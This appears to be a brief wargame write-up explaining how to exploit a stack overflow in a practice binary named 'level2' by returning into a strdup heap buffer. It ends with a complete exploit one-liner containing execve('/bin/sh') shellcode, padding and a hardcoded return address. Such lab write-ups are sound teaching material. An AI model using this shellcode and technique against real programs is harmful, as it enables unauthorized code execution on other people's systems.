we cant overwrite the eip address by a stack address because the program checks if the EIP address starts with 0xb
which is the stack

but strdup returns an address on the heap, which is the buffer from gets
so lets try giving it a shellcode of 21 bytes, + 59 bytes of random data, A's in this case to equal 80
then the return address of that same string, the return address of strdup which will then execute it from the beginning
thus giving us a shell.

cat <(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"') - | ./level2
